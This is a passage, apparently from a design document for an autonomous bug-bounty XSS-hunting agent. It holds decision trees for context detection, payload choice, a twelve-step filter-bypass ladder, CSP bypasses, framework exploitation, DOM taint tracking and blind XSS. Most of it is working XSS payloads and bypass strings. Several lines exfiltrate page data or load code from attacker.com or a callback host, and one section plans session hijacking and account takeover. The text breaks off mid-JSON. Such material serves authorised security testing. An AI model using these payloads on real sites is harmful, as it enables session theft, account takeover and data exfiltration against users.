# XSS Agent Decision Logic

## Overview

This document defines the complete decision-making logic for the BBAG3NT-09 XSS Hunter Agent. It provides structured decision trees for every critical juncture during testing: context detection, payload selection, bypass escalation, CSP bypass, framework-specific exploitation, DOM XSS taint tracking, stored/blind XSS strategy, impact escalation, and cross-agent communication. Each decision tree is designed to be machine-executable -- the agent traverses these trees during testing to make deterministic, optimal choices.

**Related documents**: `XSS_AGENT_PROMPT.md` (agent system prompt), `methodology.md` (phased testing methodology)

---

## 1. Context Detection Algorithm

### 1.1 Primary Context Detection

When a reflection point is discovered, execute this algorithm to classify the injection context:

```
INPUT: canary_string = "xss<>'"%;)(&#{}"
INPUT: response_body = HTTP response after submitting canary
OUTPUT: context_type (one of 13 defined contexts)

STEP 1: Search response_body for canary_string
  |
  +---> FOUND in response source?
  |     |
  |     +---> YES: Server-side reflection detected --> Go to STEP 2
  |     +---> NO: Go to STEP 6 (check DOM/stored/blind)
  |
STEP 2: Identify surrounding context of reflection
  |
  +---> Is canary between HTML open/close tags? (e.g., <div>CANARY</div>)
  |     |
  |     +---> Is the parent element a raw-text element?
  |     |     (<textarea>, <title>, <noscript>, <style>, <script>, <xmp>, <iframe>)
  |     |     +---> YES: context_type = "RCDATA" (Context 9)
  |     |     +---> NO: context_type = "HTML_BODY" (Context 1)
  |     |
  |     +---> Return context_type
  |
  +---> Is canary inside an HTML attribute value? (e.g., value="CANARY")
  |     |
  |     +---> Is the attribute a URL-type? (href, src, action, formaction, data, poster, codebase)
  |     |     +---> YES: context_type = "URL_ATTRIBUTE" (Context 3)
  |     |     +---> NO: Is it a hidden input type?
  |     |           +---> YES: context_type = "HIDDEN_INPUT" (Context 13)
  |     |           +---> NO: context_type = "HTML_ATTRIBUTE" (Context 2)
  |     |
  |     +---> Return context_type
  |
  +---> Is canary inside a <script> block?
  |     |
  |     +---> Is it inside a quoted string? ("CANARY" or 'CANARY')
  |     |     +---> Double-quoted: context_type = "JS_STRING_DOUBLE" (Context 4a)
  |     |     +---> Single-quoted: context_type = "JS_STRING_SINGLE" (Context 4b)
  |     |
  |     +---> Is it inside a template literal? (`CANARY`)
  |     |     +---> YES: context_type = "JS_TEMPLATE_LITERAL" (Context 5)
  |     |
  |     +---> Is it in a JSONP callback? (callback=CANARY)
  |     |     +---> YES: context_type = "JSONP_CALLBACK" (Context 10b)
  |     |
  |     +---> Is it in a JS expression? (if(CANARY) or func(CANARY))
  |     |     +---> YES: context_type = "JS_EXPRESSION" (Context 4c)
  |     |
  |     +---> Return context_type
  |
  +---> Is canary inside an HTML comment? (<!-- CANARY -->)
  |     +---> YES: context_type = "HTML_COMMENT" (Context 6)
  |
  +---> Is canary inside a <style> block or style attribute?
  |     +---> YES: context_type = "CSS_CONTEXT" (Context 7)
  |
  +---> Is canary inside <svg> or <math> content?
  |     +---> YES: context_type = "SVG_MATHML" (Context 8)
  |
  +---> Is canary inside a JSON response body?
  |     +---> YES: context_type = "JSON_RESPONSE" (Context 10a)
  |
  +---> Cannot classify: context_type = "UNKNOWN" --> manual analysis required

STEP 6: Canary NOT found in response source
  |
  +---> Render the page in a headless browser
  +---> Search the rendered DOM for the canary
  |     |
  |     +---> FOUND in rendered DOM but not in source?
  |     |     +---> YES: context_type = "DOM_XSS" (Context 11)
  |     |           (Client-side JavaScript wrote canary to DOM)
  |     |
  |     +---> NOT found in DOM either?
  |           +---> Input may be stored: check other pages for canary
  |           |     +---> FOUND on another page: context_type = "STORED" (Context 12a)
  |           |     +---> NOT found anywhere: context_type = "BLIND_CANDIDATE" (Context 12b)
  |           |           Deploy blind XSS payload immediately
  |
  +---> Return context_type
```

### 1.2 Sub-Context Detection: Quote Type

When context is `HTML_ATTRIBUTE` or `JS_STRING`, determine the quote delimiter:

```
ATTRIBUTE QUOTE DETECTION:
  |
  +---> Examine characters surrounding the canary reflection
  |
  +---> value="CANARY"  --> quote_type = "double"
  +---> value='CANARY'  --> quote_type = "single"
  +---> value=CANARY    --> quote_type = "none"
  +---> value=`CANARY`  --> quote_type = "backtick" (IE only, rare)
```

### 1.3 Character Survival Analysis

For the detected context, analyze which characters survived unencoded:

```
CHARACTER ANALYSIS:
  INPUT: canary = "xss<>'"%;)(&#{}"
  INPUT: reflected_canary = (as it appears in response)

  For each character in [<, >, ", ', (, ), /, {, }, ;, %, &, #]:
    |
    +---> Compare original vs reflected
    |     +---> Character unchanged: survived = TRUE
    |     +---> Character replaced with HTML entity: survived = FALSE, encoding = "html_entity"
    |     +---> Character replaced with URL encoding: survived = FALSE, encoding = "url_encode"
    |     +---> Character removed entirely: survived = FALSE, encoding = "stripped"
    |     +---> Character replaced with backslash escape: survived = FALSE, encoding = "backslash"
    |
    +---> Record in character_survival_matrix

  OUTPUT: character_survival_matrix = {
    "<": {survived: bool, encoding: string},
    ">": {survived: bool, encoding: string},
    ...
  }
```

---

## 2. Payload Selection Per Context (Decision Trees)

### 2.1 HTML Body Context Payload Selection

```
CONTEXT = HTML_BODY
  |
  +---> Do angle brackets < > survive unencoded?
  |     |
  |     +---> YES: Tag injection is possible
  |     |     |
  |     |     +---> Is any WAF/filter detected?
  |     |     |     |
  |     |     |     +---> NO: Use primary payload set
  |     |     |     |     Priority: <img src=x onerror=alert(1)>
  |     |     |     |              <svg onload=alert(1)>
  |     |     |     |              <details open ontoggle=alert(1)>
  |     |     |     |
  |     |     |     +---> YES: Use uncommon tags first
  |     |     |           Priority: <details open ontoggle=confirm(1)>
  |     |     |                     <math><mi//onclick=alert(1)>
  |     |     |                     <input autofocus onfocus=alert(1)>
  |     |     |                     (See bypass escalation ladder)
  |     |     |
  |     |     +---> Are parentheses ( ) survived?
  |     |           +---> NO: Use backtick: alert`1`
  |     |           +---> YES: Use standard function call
  |     |
  |     +---> NO: Angle brackets encoded
  |           Cannot inject new tags.
  |           Check if input also appears in other contexts.
  |           Consider template injection: {{7*7}} if Angular/Vue detected.
  |           DEAD END for HTML body context -- pivot to other contexts.
```

### 2.2 HTML Attribute Context Payload Selection

```
CONTEXT = HTML_ATTRIBUTE
  |
  +---> What quote type wraps the attribute?
  |     |
  |     +---> DOUBLE QUOTE (value="CANARY")
  |     |     +---> Does " survive unencoded?
  |     |     |     +---> YES: Breakout with " then add event handler
  |     |     |     |     Payload: " onfocus=alert(1) autofocus "
  |     |     |     |     Payload: "><img src=x onerror=alert(1)>
  |     |     |     +---> NO: Quote is encoded
  |     |     |           +---> Do angle brackets survive?
  |     |     |                 +---> YES: Close tag and inject: >CLOSE_TAG<img src=x onerror=alert(1)>
  |     |     |                 +---> NO: Both encoded -- DEAD END in this context
  |     |     |
  |     +---> SINGLE QUOTE (value='CANARY')
  |     |     +---> Does ' survive unencoded?
  |     |           +---> YES: Breakout: ' onfocus=alert(1) autofocus '
  |     |           +---> NO: Same logic as double quote above
  |     |
  |     +---> NO QUOTE (value=CANARY)
  |           +---> Space or > will break out
  |                 Payload: SPACE onfocus=alert(1) autofocus
  |                 Payload: ><img src=x onerror=alert(1)>
  |
  +---> After breakout, which event handler to use?
        Priority (no-interaction required first):
        1. onfocus + autofocus (no interaction)
        2. onmouseover (hover)
        3. onclick (click)
        4. onerror (requires media/image element with invalid src)
```

### 2.3 URL Attribute Context Payload Selection

```
CONTEXT = URL_ATTRIBUTE (href, src, action, formaction)
  |
  +---> Does the application validate URL protocol?
  |     |
  |     +---> NO validation:
  |     |     Payload: javascript:alert(1)
  |     |     Payload: javascript:alert(document.domain)
  |     |
  |     +---> Blocks "javascript:" literally:
  |     |     Try: &#106;avascript:alert(1) (HTML entity bypass)
  |     |     Try: java\nscript:alert(1) (newline bypass)
  |     |     Try: javascript\x09:alert(1) (tab bypass)
  |     |     Try: data:text/html,<script>alert(1)</script>
  |     |
  |     +---> Whitelist-based validation (only http/https):
  |           Cannot use javascript: protocol
  |           +---> Can you break out of the attribute?
  |                 +---> YES: Use attribute breakout payloads (Context 2)
  |                 +---> NO: DEAD END in URL context
```

### 2.4 JavaScript String Context Payload Selection

```
CONTEXT = JS_STRING (double or single quote)
  |
  +---> Does the closing quote survive unescaped?
  |     |
  |     +---> YES: Close string and inject
  |     |     Double: ";alert(1);//
  |     |     Single: ';alert(1);//
  |     |
  |     +---> NO (quote is backslash-escaped):
  |           +---> Does backslash \ survive?
  |           |     +---> YES: Escape the escape: \\";alert(1);//
  |           |     |     (Produces \\" which ends the escape and closes the string)
  |           |     +---> NO: Both quote and backslash handled
  |           |
  |           +---> Does </script> survive?
  |           |     +---> YES: Exit script context entirely:
  |           |           </script><img src=x onerror=alert(1)>
  |           |     +---> NO: </script> is blocked
  |           |
  |           +---> Are Unicode line terminators allowed?
  |                 Try: \u2028 or \u2029 (line/paragraph separators)
  |                 These terminate JS strings in some parsers
  |
  +---> TEMPLATE LITERAL (backtick string):
        +---> Inject expression: ${alert(1)}
        +---> If alert blocked: ${constructor.constructor('alert(1)')()}
```

### 2.5 RCDATA Element Payload Selection

```
CONTEXT = RCDATA (textarea, title, noscript, xmp, iframe)
  |
  +---> Identify the parent RCDATA element
  |
  +---> Can you close the parent element?
  |     +---> Does </textarea> survive? (or </title>, </noscript>, etc.)
  |     |     +---> YES: Close parent and inject:
  |     |     |     </textarea><img src=x onerror=alert(1)>
  |     |     +---> NO: Closing tag is filtered
  |     |           Try: </TEXTAREA> (case variation)
  |     |           Try: </textarea > (space before >)
  |     |           Try: </textarea/> (self-closing variation)
  |     |
  |     +---> DEAD END if closing tag is completely blocked
```

### 2.6 SVG/MathML Context Payload Selection

```
CONTEXT = SVG_MATHML (inside <svg> or <math> foreign content)
  |
  +---> Inside SVG?
  |     Payloads:
  |     <animate onbegin=alert(1) attributeName=x dur=1s>
  |     <set onbegin=alert(1) attributename=x to=x>
  |     <svg/onload=alert(1)>
  |
  +---> Inside MathML?
  |     Payloads:
  |     <math><mi//onclick=alert(1)>click</mi></math>
  |     <math><mtext><img src=x onerror=alert(1)></mtext></math>
  |     Namespace confusion: MathML -> HTML parser switch
  |
  +---> Can create new child elements?
        +---> YES: Inject event handler elements within SVG/MathML
        +---> NO: Try namespace confusion to switch parser to HTML mode
```

### 2.7 CSS Context Payload Selection

```
CONTEXT = CSS (inside <style> or style="" attribute)
  |
  +---> Can you close the <style> element?
  |     +---> YES: </style><img src=x onerror=alert(1)>
  |     +---> NO: Stay in CSS context
  |           |
  |           +---> CSS exfiltration via attribute selectors:
  |           |     input[value^="a"] { background: url(https://attacker.com/a) }
  |           |     (Leak data character by character)
  |           |
  |           +---> IE targets only: expression(alert(1))
  |           |
  |           +---> @import url(https://attacker.com/steal.css)
```

### 2.8 HTML Comment Context Payload Selection

```
CONTEXT = HTML_COMMENT (inside <!-- ... -->)
  |
  +---> Does --> survive unencoded?
  |     +---> YES: Close comment and inject:
  |     |     --><img src=x onerror=alert(1)>
  |     |     Alternative: --!><img src=x onerror=alert(1)>
  |     |
  |     +---> NO: --> is filtered
  |           Try: --!> (conditional comment close)
  |           Try: --> with encoding variations
  |           If blocked: DEAD END in comment context
```

### 2.9 JSON/API Response Payload Selection

```
CONTEXT = JSON_RESPONSE
  |
  +---> Check Content-Type header
  |     |
  |     +---> Content-Type: application/json + X-Content-Type-Options: nosniff?
  |     |     +---> YES: Browser will NOT render as HTML
  |     |     |     NOT exploitable as reflected XSS in modern browsers
  |     |     |     Check for: JSONP callback injection, or JSON data consumed by client-side JS
  |     |     |
  |     |     +---> NO (missing nosniff or wrong Content-Type):
  |     |           Browser may MIME-sniff and render as HTML
  |     |           Try: inject HTML tags in JSON values
  |     |
  |     +---> Is this JSONP? (callback parameter)
  |           +---> YES: callback=alert(1)//
  |           |     Or: callback=alert(1)%2F%2F
  |           +---> NO: Check if JSON is embedded in HTML <script> tag
  |                 If yes: </script><img src=x onerror=alert(1)>
```

---

## 3. Bypass Escalation Logic (12-Step Ladder)

```
PAYLOAD BLOCKED (initial payload did not execute)
  |
  v
STEP 1: DETERMINE WHAT IS FILTERED
  Submit individual probes:
  - <script>         --> tag blocked?
  - <img>            --> alt tags blocked?
  - onerror          --> event blocked?
  - alert            --> function blocked?
  - javascript:      --> protocol blocked?
  - < >              --> angles encoded?
  - " '              --> quotes encoded?
  - on               --> event prefix blocked?
  Record: filter_map = {tag_blocked: bool, event_blocked: bool, ...}
  |
  v
STEP 2: RAW PAYLOAD (baseline)
  Try: <script>alert(1)</script>
  +---> Executes? --> DONE (unlikely if initial was blocked)
  +---> Blocked? --> Continue
  |
  v
STEP 3: ALTERNATIVE TAGS
  Condition: <script> blocked but other tags may work
  Try: <img src=x onerror=alert(1)>
  Try: <svg onload=alert(1)>
  Try: <body onload=alert(1)>
  +---> Executes? --> DONE
  +---> Blocked? --> Continue
  |
  v
STEP 4: UNCOMMON TAGS + EVENTS
  Condition: Common tags (script, img, svg) blocked
  Try: <details open ontoggle=alert(1)>
  Try: <math><mi//onclick=alert(1)>click</mi></math>
  Try: <input autofocus onfocus=alert(1)>
  Try: <marquee onstart=alert(1)>
  Try: <video><source onerror=alert(1)>
  Try: <audio src=x onerror=alert(1)>
  +---> Executes? --> DONE
  +---> Blocked? --> Continue
  |
  v
STEP 5: CASE VARIATION
  Condition: Filter may be case-sensitive
  Try: <ScRiPt>alert(1)</ScRiPt>
  Try: <IMG SRC=x OnErRoR=alert(1)>
  Try: <SVG ONLOAD=alert(1)>
  +---> Executes? --> DONE
  +---> Blocked? --> Continue
  |
  v
STEP 6: ALTERNATIVE FUNCTIONS
  Condition: "alert" keyword is specifically filtered
  Try: confirm(1)
  Try: prompt(1)
  Try: print()
  Try: top["al"+"ert"](1)
  Try: window["alert"](1)
  Try: [].constructor.constructor('alert(1)')()
  Try: self["alert"](1)
  +---> Executes? --> DONE
  +---> Blocked? --> Continue
  |
  v
STEP 7: ENCODING IN ATTRIBUTES
  Condition: Filter is pre-render, but browser will decode HTML entities in attributes
  Try: <img src=x onerror=&#97;lert(1)>
  Try: <img src=x onerror=&#x61;lert(1)>
  Try: <img src=x onerror=\u0061lert(1)>
  Try: <a href=&#106;avascript:alert(1)>click</a>
  +---> Executes? --> DONE
  +---> Blocked? --> Continue
  |
  v
STEP 8: WHITESPACE AND NULL BYTE INSERTION
  Condition: Filter uses simple regex that doesn't account for whitespace variations
  Try: <img/src=x/onerror=alert(1)>
  Try: <img%09src=x%09onerror=alert(1)>  (tab characters)
  Try: <img%0asrc=x%0aonerror=alert(1)>  (newline characters)
  Try: <img%00src=x%00onerror=alert(1)>  (null bytes)
  Try: <img src =x onerror  =alert(1)>   (extra spaces)
  +---> Executes? --> DONE
  +---> Blocked? --> Continue
  |
  v
STEP 9: DOUBLE ENCODING
  Condition: Server URL-decodes twice, filter only checks after first decode
  Try: %253Cscript%253Ealert(1)%253C/script%253E
  Try: %2522%2520onfocus%253Dalert(1)
  Try: %26lt; (double-encoded HTML entity)
  +---> Executes? --> DONE
  +---> Blocked? --> Continue
  |
  v
STEP 10: NESTED / RECURSIVE BYPASS
  Condition: Filter strips dangerous strings once but not recursively
  Try: <scr<script>ipt>alert(1)</scr</script>ipt>
  Try: <img src=x on<error>error=alert(1)>
  Try: <scr\x00ipt>alert(1)</scr\x00ipt>
  +---> Executes? --> DONE
  +---> Blocked? --> Continue
  |
  v
STEP 11: POLYGLOT PAYLOADS
  Condition: Need a payload that works across multiple contexts
  Try: jaVasCript:/*-/*`/*\`/*'/*"/**/(/**/oNcliCk=alert())//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
  Try: '">><marquee><img src=x onerror=confirm(1)></marquee>
  Try: "><img src=x onerror=alert(1)//
  +---> Executes? --> DONE
  +---> Blocked? --> Continue
  |
  v
STEP 12: WAF AGENT HANDOFF
  All local bypass techniques exhausted.
  Delegate to BBAG3NT-10 (WAF Bypass Agent):
  - Send: WAF vendor, all blocked payloads, character survival matrix, injection context
  - Receive: Mutated payloads with vendor-specific bypasses
  - Test received payloads
  - If blocked: Send feedback and request iteration
  - Loop until: bypass found OR all techniques exhausted
  - If exhausted: Document as "WAF-hardened, no bypass found" and move on
```

---

## 4. CSP Bypass Decision Tree

```
CSP BLOCKS SCRIPT EXECUTION
  |
  v
STEP 1: Parse CSP policy completely
  Extract: script-src, default-src, base-uri, form-action, object-src
  |
  v
STEP 2: Check for trivial bypasses
  |
  +---> 'unsafe-inline' in script-src?
  |     +---> YES: Inline scripts should execute. Re-check issue (not a CSP problem).
  |
  +---> 'unsafe-eval' in script-src?
  |     +---> YES: Find code paths to Function(), setTimeout(string), setInterval(string)
  |     |     Craft payload that reaches these sinks.
  |
  +---> data: in script-src?
  |     +---> YES: <script src="data:text/javascript,alert(1)"></script>
  |
  v
STEP 3: Check for whitelisted domain bypasses
  |
  +---> Enumerate all whitelisted domains in script-src
  |
  +---> For each domain, check:
  |     |
  |     +---> Does it serve JSONP endpoints?
  |     |     Search JSONBee database: https://github.com/nickcis/jsonbee
  |     |     If JSONP found: <script src="https://whitelisted.com/api?callback=alert(1)//"></script>
  |     |
  |     +---> Does it serve old Angular (< 1.6)?
  |     |     If yes: Load Angular + use sandbox bypass
  |     |     <script src="https://whitelisted-cdn.com/angular/1.5.8/angular.min.js"></script>
  |     |     <div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
  |     |
  |     +---> Does it serve user-uploadable content?
  |     |     If yes: Upload JS file, reference via script src
  |     |
  |     +---> Does it host an open redirect?
  |           If yes: Chain open redirect to load attacker script
  |
  v
STEP 4: Check for nonce/hash bypasses
  |
  +---> Is nonce-based CSP used?
  |     |
  |     +---> Is the nonce value visible in the DOM?
  |     |     Check: meta tags, data-* attributes, JS variables, inline comments
  |     |     If found: Use leaked nonce in <script nonce="LEAKED">alert(1)</script>
  |     |
  |     +---> Does any XSS inject before the nonce is assigned to a script tag?
  |     |     If yes: Inject <script nonce> element before the legitimate one
  |     |
  |     +---> Is strict-dynamic present?
  |           |
  |           +---> Find a nonced/hashed script that dynamically creates <script> elements
  |           |     (Script gadget hunting)
  |           |     If gadget found: Leverage it to load attacker-controlled code
  |           |
  |           +---> Common gadgets to check:
  |                 - require.js / AMD loaders
  |                 - Google Tag Manager
  |                 - Analytics libraries that eval config
  |                 - jQuery getScript()
  |
  v
STEP 5: Check for structural bypasses
  |
  +---> Is base-uri unrestricted?
  |     +---> YES: <base href="https://attacker.com/">
  |     |     Hijacks all relative script paths to load from attacker domain
  |
  +---> Is form-action unrestricted?
  |     +---> YES: <form action="https://attacker.com/steal"><input name=data><button>Submit</button></form>
  |     |     Hijack form submissions for data theft
  |
  +---> Is object-src unrestricted?
  |     +---> YES: <object data="data:text/html,<script>alert(1)</script>">
  |
  v
STEP 6: Non-execution attacks (CSP-compatible)
  |
  +---> Dangling markup injection:
  |     <img src="https://attacker.com/steal?data=   (unclosed tag captures page content)
  |
  +---> CSS injection for data exfiltration:
  |     input[value^="a"] { background: url(https://attacker.com/a) }
  |     Leak sensitive data (CSRF tokens, etc.) character by character
  |
  +---> DNS prefetch exfiltration:
  |     <link rel="dns-prefetch" href="//data.attacker.com">
  |     Bypass connect-src restrictions via DNS
  |
  +---> Meta redirect:
  |     <meta http-equiv="refresh" content="0;url=https://attacker.com">
  |
  v
STEP 7: Document CSP strength
  If no bypass found: Document the CSP policy as "strong" with assessment details.
  Note any near-miss bypasses for future reference.
```

---

## 5. Framework-Specific Detection and Exploitation Logic

### 5.1 Angular Detection and Exploitation

```
ANGULAR DETECTED
  |
  v
[1] Determine Angular version
  |
  +---> Angular 1.x (AngularJS)?
  |     |
  |     +---> Version < 1.6?
  |     |     +---> YES: Template sandbox bypass available
  |     |     |     Payload: {{constructor.constructor('alert(1)')()}}
  |     |     |     Payload: {{$on.constructor('alert(1)')()}}
  |     |     |
  |     |     +---> NO (1.6+): Sandbox removed, but ng-app still needed
  |     |           +---> Is ng-app or ng-csp present on a controllable element?
  |     |                 +---> YES: Template injection still works
  |     |                 +---> NO: Cannot exploit Angular template injection
  |     |
  |     +---> Is user input rendered in uncompiled templates?
  |           (i.e., raw {{}} in HTML source before Angular compilation)
  |           +---> YES: Client-side template injection
  |           +---> NO: Angular compiles templates before rendering; standard XSS approaches
  |
  +---> Angular 2+ (Modern Angular)?
        |
        +---> Search for bypassSecurityTrustHtml() in source code
        |     +---> FOUND: Input to this function = direct XSS
        |
        +---> Search for [innerHTML]="userInput" in templates
        |     +---> FOUND: Angular sanitizes this, but check for bypasses
        |
        +---> Check for SSR (Angular Universal) hydration issues
```

### 5.2 React Detection and Exploitation

```
REACT DETECTED
  |
  v
[1] React escapes JSX output by default. Target known bypass patterns:
  |
  +---> Search for dangerouslySetInnerHTML usage:
  |     grep -r "dangerouslySetInnerHTML" in source/bundles
  |     +---> FOUND with user input: Direct XSS via HTML injection
  |
  +---> Search for href/src with user-controlled values:
  |     <a href={userInput}> with javascript: protocol
  |     +---> FOUND: javascript:alert(1) in href
  |
  +---> Check for SSR hydration mismatches (Next.js):
  |     Server renders one thing, client hydrates with user input
  |     Check __NEXT_DATA__ for reflected user input
  |
  +---> Check for React.createElement with user-controlled type:
        React.createElement(userInput, ...) --> component injection
```

### 5.3 Vue.js Detection and Exploitation

```
VUE DETECTED
  |
  v
[1] Determine Vue version
  |
  +---> Vue 2?
  |     +---> Search for v-html directive with user input
  |     |     <div v-html="userInput"></div>
  |     |     +---> FOUND: Direct HTML injection, XSS
  |     |
  |     +---> Uncompiled templates with user input?
  |           {{userInput}} in raw HTML source (before Vue compilation)
  |           +---> YES: Client-side template injection
  |           |     Payload: {{constructor.constructor('alert(1)')()}}
  |           +---> NO: Vue compiles templates; standard approaches
  |
  +---> Vue 3?
        +---> Similar to Vue 2, but v-html is the primary target
        +---> Check for SSR (Nuxt.js) hydration mismatches
```

### 5.4 jQuery Detection and Exploitation

```
JQUERY DETECTED
  |
  v
[1] jQuery version < 3.5.0?
  |  +---> YES: Known XSS in $.htmlPrefilter and selector parsing
  |
  v
[2] Search for dangerous jQuery sink patterns:
  |
  +---> $(userInput)     --> Selector injection (jQuery parses HTML if input starts with <)
  +---> .html(userInput) --> Direct HTML injection
  +---> .append(userInput)  --> Direct HTML injection
  +---> .after(userInput)   --> Direct HTML injection
  +---> .before(userInput)  --> Direct HTML injection
  +---> .replaceWith(userInput) --> Direct HTML injection
  |
  +---> For each found: trace whether userInput comes from an attacker-controllable source
        (URL hash, query param, postMessage, etc.)
```

---

## 6. DOM XSS Taint Tracking Logic

```
DOM XSS ANALYSIS
  |
  v
STEP 1: Identify all DOM XSS sources in JavaScript code
  |
  Search for patterns:
  - location.href, location.hash, location.search, location.pathname
  - document.URL, document.documentURI, document.baseURI
  - document.referrer
  - window.name
  - postMessage event handlers: addEventListener('message', ...)
  - localStorage.getItem(), sessionStorage.getItem()
  - document.cookie
  - URLSearchParams
  |
  v
STEP 2: For each source, trace data flow
  |
  +---> Is the source value assigned to a variable?
  |     var input = location.hash.slice(1);
  |     Track variable: input
  |
  +---> Is the variable passed through any transformations?
  |     - decodeURIComponent() --> Makes URL encoding transparent
  |     - JSON.parse() --> Parsed as data
  |     - .replace(/pattern/, '') --> Partial sanitization (may be bypassable)
  |     - encodeURIComponent() --> Encoded for URL safety (likely safe)
  |     - DOMPurify.sanitize() --> Sanitized (check version for bypasses)
  |     - .split(), .substring() --> Partial extraction
  |
  v
STEP 3: Does the data reach a dangerous sink?
  |
  +---> HTML injection sinks:
  |     element.innerHTML = input
  |     document.write(input)
  |     element.insertAdjacentHTML('beforeend', input)
  |     jQuery(element).html(input)
  |     jQuery(element).append(input)
  |
  +---> Code execution sinks:
  |     Function(input)()
  |     setTimeout(input, 0)  (string argument form)
  |     setInterval(input, 0) (string argument form)
  |
  +---> URL navigation sinks:
  |     location.href = input
  |     location.assign(input)
  |     window.open(input)
  |
  v
STEP 4: Assess exploitability
  |
  +---> Does a complete source-to-sink flow exist with no effective sanitization?
  |     +---> YES: DOM XSS confirmed
  |     |     Craft payload in the source that reaches the sink
  |     |     Example: If location.hash -> innerHTML
  |     |     URL: https://target.com/page#<img src=x onerror=alert(1)>
  |     |
  |     +---> NO (sanitization present):
  |           +---> Is sanitization effective? (check for known bypasses)
  |           +---> Can sanitization be bypassed? (mXSS, encoding, truncation)
  |           +---> DEAD END if sanitization is robust
  |
  v
STEP 5: Verify DOM XSS in browser
  - Open target URL with payload in source
  - Confirm execution in browser console
  - Check that document.domain matches target (not a false positive)
```

---

## 7. Stored/Blind XSS Strategy Logic

### 7.1 Stored XSS Decision Tree

```
STORED XSS TESTING
  |
  v
[1] Identify storage points
  Where is user input stored and later displayed?
  - User profiles (name, bio, avatar alt text)
  - Comments / posts / messages
  - File uploads (filename, metadata)
  - Settings / preferences
  - Rich text / WYSIWYG editors
  |
  v
[2] Submit test payload
  Use a harmless-looking but detectable payload first:
  <b>test</b>  or  <i>test</i>
  |
  +---> Is HTML preserved in output?
  |     +---> YES: Rich HTML rendering detected
  |     |     Escalate to: <img src=x onerror=alert(1)>
  |     |
  |     +---> NO (HTML stripped or encoded):
  |           Analyze what was stripped/encoded
  |           Apply bypass escalation ladder (Section 3)
  |
  v
[3] Check rendering contexts
  Where does the stored data appear?
  - Same page (immediate display)
  - Other pages (profile page, search results, admin panel)
  - Other users' views (cross-user stored XSS)
  - Email notifications (email XSS)
  - PDF/document generation (document XSS)
  |
  v
[4] Cross-user impact assessment
  Can other users see the stored XSS?
  +---> YES: High/Critical severity (multi-user impact)
  +---> Only self-visible: Lower severity (self-XSS, needs chain)
```

### 7.2 Blind XSS Decision Tree

```
BLIND XSS STRATEGY
  |
  v
[1] Identify blind injection surfaces
  Inputs consumed by internal/admin systems:
  - Contact forms -> support dashboard
  - Support tickets -> admin panel
  - User registration fields -> admin user management
  - Feedback forms -> internal analytics
  - Error reports -> developer dashboard
  - HTTP headers (User-Agent, Referer) -> logging dashboards
  - File upload metadata -> file management systems
  |
  v
[2] Deploy callback payloads
  For each surface, inject blind XSS with unique identifiers:
  "><script src=https://YOUR-CALLBACK.xss.ht?id=surface_name></script>
  |
  v
[3] Monitor callback server
  Wait for callbacks (may take hours or days)
  |
  +---> Callback received?
  |     +---> YES: Blind XSS confirmed!
  |     |     Analyze callback data:
  |     |     - URL where payload fired (admin panel? internal tool?)
  |     |     - Document cookies (admin session?)
  |     |     - DOM snapshot (what data is exposed?)
  |     |     Severity: Usually Critical (admin context)
  |     |
  |     +---> NO (after monitoring period):
  |           Document as "blind XSS deployed, no callback received"
  |           May fire later if admin reviews old data
```

---

## 8. Impact Escalation Decision Tree

```
XSS CONFIRMED (execution verified)
  |
  v
[1] Assess cookie accessibility
  |
  +---> Can document.cookie read session cookies?
  |     (Check: Set-Cookie headers for HttpOnly flag)
  |     |
  |     +---> YES (no HttpOnly): SESSION HIJACK
  |     |     Impact: CRITICAL
  |     |     Payload: Cookie theft + session impersonation
  |     |
  |     +---> NO (HttpOnly set): Continue to [2]
  |
  v
[2] Check for JS-accessible tokens
  |
  +---> localStorage contains auth tokens?
  |     +---> YES: TOKEN THEFT --> CRITICAL
  |
  +---> sessionStorage contains auth tokens?
  |     +---> YES: TOKEN THEFT --> CRITICAL
  |
  +---> JavaScript variables contain tokens?
  |     (Check: window.token, __INITIAL_STATE__, data-token)
  |     +---> YES: TOKEN THEFT --> CRITICAL
  |
  +---> CSRF tokens accessible?
  |     +---> YES: Continue to [3]
  |
  v
[3] Perform authenticated actions
  |
  +---> Can XSS change user password?
  |     +---> YES: ACCOUNT TAKEOVER --> CRITICAL
  |
  +---> Can XSS change user email?
  |     +---> YES: ACCOUNT TAKEOVER (via password reset) --> CRITICAL
  |
  +---> Can XSS perform sensitive actions?
  |     (Transfer funds, modify permissions, export data)
  |     +---> YES: HIGH severity
  |
  v
[4] Assess blast radius
  |
  +---> Is this stored XSS visible to multiple users?
  |     +---> YES: Can it self-replicate? (XSS worm)
  |     |     +---> YES: CRITICAL (wormable XSS)
  |     |     +---> NO: HIGH-CRITICAL (multi-user impact)
  |
  +---> Is this XSS in an admin context?
  |     +---> YES: CRITICAL (admin compromise)
  |
  +---> Is this in an Electron app?
  |     +---> YES: Check nodeIntegration/contextIsolation
  |     |     +---> nodeIntegration enabled: CRITICAL (XSS -> RCE)
  |
  +---> Is this in a mobile WebView?
  |     +---> YES: Check for JavaScript bridge
  |     |     +---> Bridge exists: CRITICAL (native API access)
  |
  v
[5] Final severity assignment
  |
  +---> Session/token theft possible:     CRITICAL (CVSS 9.0+)
  +---> Account takeover possible:        CRITICAL (CVSS 9.0+)
  +---> Admin compromise:                 CRITICAL (CVSS 9.0+)
  +---> Wormable stored XSS:              CRITICAL (CVSS 9.0+)
  +---> RCE via Electron/WebView:         CRITICAL (CVSS 10.0)
  +---> Authenticated action execution:   HIGH (CVSS 7.0-8.9)
  +---> Data exfiltration only:           HIGH (CVSS 7.0-8.9)
  +---> Phishing overlay:                 HIGH (CVSS 7.0-8.9)
  +---> Reflected, limited data access:   MEDIUM (CVSS 4.0-6.9)
  +---> Self-XSS (requires chain):        LOW-MEDIUM (CVSS 2.0-5.0)
```

---

## 9. Cross-Agent Communication Protocol

### 9.1 Requesting Data from Other Agents

```
NEED AUTH CONTEXT?
  |
  v
Send to BBAG3NT-03 (Auth Agent):
{
  "request_type": "session_context",
  "agent_id": "xss-agent",
  "target": "https://target.com",
  "requirements": {
    "roles_needed": ["user", "admin"],
    "include_csrf_tokens": true,
    "include_cookie_flags": true
  }
}
  |
  v
Receive: Session cookies, bearer tokens, CSRF tokens, auth model, cookie flags, role matrix
  |
  v
Use cookie flags to determine exploitation strategy (Section 8)

---

NEED RECON DATA?
  |
  v
Send to BBAG3NT-01/02 (Recon Agent):
{
  "request_type": "target_profile",
  "agent_id": "xss-agent",
  "target": "https://target.com",
